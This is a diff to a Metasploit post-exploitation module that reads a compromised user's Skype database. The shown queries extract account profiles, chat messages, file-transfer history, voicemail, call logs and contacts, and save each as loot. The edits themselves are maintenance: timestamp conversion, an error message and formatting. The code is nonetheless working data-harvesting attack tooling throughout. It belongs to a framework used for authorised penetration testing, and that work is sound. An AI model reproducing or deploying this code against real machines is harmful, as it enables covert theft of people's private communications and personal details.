@@ -55,7 +55,7 @@ class Metasploit3 < Msf::Post
 		begin
 			require 'sqlite3'
 		rescue LoadError
-			print_error("SQLite3 is not available, and we are not able to parse the database.")
+			print_error("Failed to load sqlite3, try 'gem install sqlite3'")
 			return
 		end
 
@@ -132,22 +132,26 @@ class Metasploit3 < Msf::Post
 		print_status("Enumerating accounts")
 		user_rows = db.execute2('SELECT "skypeout_balance_currency", "skypeout_balance", "skypeout_precision",
 					"skypein_numbers", "subscriptions", "offline_callforward", "service_provider_info",
-					"registration_timestamp", "nr_of_other_instances", "partner_channel_status",
-					"flamingo_xmpp_status", "owner_under_legal_age", "type", "skypename",
-					"pstnnumber", "fullname", "birthday", "gender", "languages", "country",
-					"province", "city", "phone_home", "phone_office", "phone_mobile", "emails",
-					"homepage", "about", "profile_timestamp", "received_authrequest",
+					datetime("timestamp","unixepoch")"registration_timestamp",
+					"nr_of_other_instances", "partner_channel_status", "flamingo_xmpp_status",
+					"owner_under_legal_age", "type", "skypename", "pstnnumber", "fullname",
+					"birthday", "gender", "languages", "country", "province", "city", "phone_home",
+					"phone_office", "phone_mobile", "emails", "homepage", "about",
+					datetime("profile_timestamp","unixepoch"), "received_authrequest",
 					"displayname", "refreshing", "given_authlevel", "aliases", "authreq_timestamp",
 					"mood_text", "timezone", "nrof_authed_buddies", "ipcountry",
-					"given_displayname", "availability", "lastonline_timestamp",
-					"assigned_speeddial", "lastused_timestamp", "assigned_comment", "alertstring",
-					"avatar_timestamp", "mood_timestamp", "rich_mood_text", "synced_email",
+					"given_displayname", "availability", datetime("lastonline_timestamp","unixepoch"),
+					"assigned_speeddial", datetime("lastused_timestamp","unixepoch"),
+					"assigned_comment", "alertstring", datetime("avatar_timestamp","unixepoch"),
+					datetime("mood_timestamp","unixepoch"), "rich_mood_text", "synced_email",
 					"verified_email", "verified_company" FROM Accounts;')
 
 		# Check if an account exists and if it does enumerate if not exit.
 		if user_rows.length > 1
 			user_info = store_loot("skype.accounts",
-						"text/plain", session,"" ,
+						"text/plain", 
+						session,
+						"",
 						"skype_accounts.csv",
 						"Skype User #{user} Account information from configuration database."
 					)
@@ -159,11 +163,14 @@ class Metasploit3 < Msf::Post
 		end
 	
 		# Extract chat log from the database
-		print_status("Extracting chat message log.")
+		print_status("Extracting chat message log")
 		cl_rows = db.execute2('SELECT "chatname", "convo_id", "author", "dialog_partner",
-					"timestamp", "body_xml", "remote_id" FROM "Messages" WHERE type == 61;')
-		chat_log = store_loot("#skype.chat",
-						"text/plain", session,"" ,
+					datetime("timestamp","unixepoch"), "body_xml",
+					"remote_id" FROM "Messages" WHERE type == 61;')
+		chat_log = store_loot("skype.chat",
+						"text/plain", 
+						session,
+						"",
 						"skype_chatlog.csv",
 						"Skype User #{user} chat log from configuration database."
 					)
@@ -177,9 +184,10 @@ class Metasploit3 < Msf::Post
 
 		# Extract file transfer history
 		print_status("Extracting file transfer history")
-		ft_rows = db.execute2('SELECT "partner_handle", "partner_dispname", "starttime",
-					"finishtime", "filepath", "filename", "filesize", "bytestransferred", 
-					"convo_id", "accepttime" FROM "Transfers";')
+		ft_rows = db.execute2('SELECT "partner_handle", "partner_dispname", 
+					datetime("starttime","unixepoch"), datetime("finishtime","unixepoch"),
+					"filepath", "filename", "filesize", "bytestransferred",
+					"convo_id", datetime("accepttime","unixepoch") FROM "Transfers";')
 
 		file_transfer = store_loot("skype.filetransfer",
 					"text/csv",
@@ -199,9 +207,9 @@ class Metasploit3 < Msf::Post
 		# Extract voicemail history
 		print_status("Extracting voicemail history")
 		vm_rows = db.execute2('SELECT "type", "partner_handle", "partner_dispname", "status",
-					"subject", "timestamp", "duration", "allowed_duration", "playback_progress",
-					"convo_id", "chatmsg_guid", "notification_id", "flags", "size", "path",
-					"xmsg" FROM "Voicemails";')
+					"subject", datetime("timestamp","unixepoch"), "duration", "allowed_duration",
+					"playback_progress", "convo_id", "chatmsg_guid", "notification_id", "flags",
+					"size", "path", "xmsg" FROM "Voicemails";')
 
 		voicemail = store_loot("skype.voicemail",
 					"text/csv",
@@ -220,9 +228,10 @@ class Metasploit3 < Msf::Post
 
 		# Extracting call log
 		print_status("Extracting call log")
-		call_rows = db.execute2('SELECT "begin_timestamp", "topic","host_identity", "mike_status",
-					"duration", "soundlevel", "name", "is_incoming", "is_conference", "is_on_hold",
-					"start_timestamp", "quality_problems", "current_video_audience",
+		call_rows = db.execute2('SELECT datetime("begin_timestamp","unixepoch"),
+					"topic","host_identity", "mike_status", "duration", "soundlevel", "name",
+					"is_incoming", "is_conference", "is_on_hold",
+					datetime("start_timestamp","unixepoch"), "quality_problems", "current_video_audience",
 					"premium_video_sponsor_list", "conv_dbid" FROM "Calls";')
 
 		call_log = store_loot("skype.callhistory",
@@ -244,8 +253,8 @@ class Metasploit3 < Msf::Post
 		ct_rows = db.execute2('SELECT  "skypename", "pstnnumber", "aliases", "fullname",
 					"birthday", "languages", "country", "province", "city", "phone_home",
 					"phone_office", "phone_mobile", "emails", "homepage", "about", "mood_text",
-					"ipcountry", "lastonline_timestamp",  "displayname",  "given_displayname",
-					"assigned_speeddial", "assigned_comment","assigned_phone1",
+					"ipcountry", datetime("lastonline_timestamp","unixepoch"), "displayname",
+					"given_displayname", "assigned_speeddial", "assigned_comment","assigned_phone1",
 					"assigned_phone1_label", "assigned_phone2", "assigned_phone2_label",
 					"assigned_phone3", "assigned_phone3_label", "popularity_ord", "isblocked",
 					"main_phone", "phone_home_normalized", "phone_office_normalized",
